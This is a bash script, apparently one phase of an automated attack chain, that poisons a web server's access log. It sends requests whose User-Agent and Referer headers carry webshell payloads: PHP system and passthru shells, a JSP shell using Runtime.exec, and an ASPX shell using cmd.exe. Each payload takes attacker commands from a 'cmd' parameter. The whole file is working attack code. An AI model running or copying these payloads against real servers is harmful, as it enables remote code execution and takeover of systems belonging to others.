#!/bin/bash
# User-Agent Payload Delivery -- Phase 2: inject webshell payload via HTTP headers into access.log
# 用法: deliver_ua.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:80}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
echo "=== UA Log Poison: Payload Delivery (Phase 2) ==="

LANG="${webshell_lang:-php}"

case "$LANG" in
  php)
    curl -s "$BASE/" -H 'User-Agent: <?php system($_GET["cmd"]);?>' --max-time 5 >/dev/null 2>&1 || true
    curl -s "$BASE/" -H 'User-Agent: <?=`id`?>' --max-time 5 >/dev/null 2>&1 || true
    curl -s "$BASE/" -H 'Referer: <?php passthru($_GET["cmd"]);?>' --max-time 5 >/dev/null 2>&1 || true
    ;;
  jsp)
    PAYLOAD='<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",request.getParameter("cmd")});BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=b.readLine())!=null)out.println(l);%>'
    curl -s "$BASE/" -H "User-Agent: $PAYLOAD" --max-time 5 >/dev/null 2>&1 || true
    ;;
  aspx)
    PAYLOAD='<%@ Page Language="C#"%><%var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>'
    curl -s "$BASE/" -H "User-Agent: $PAYLOAD" --max-time 5 >/dev/null 2>&1 || true
    ;;
esac
sleep 1
echo "UA_PAYLOAD_DELIVERED"
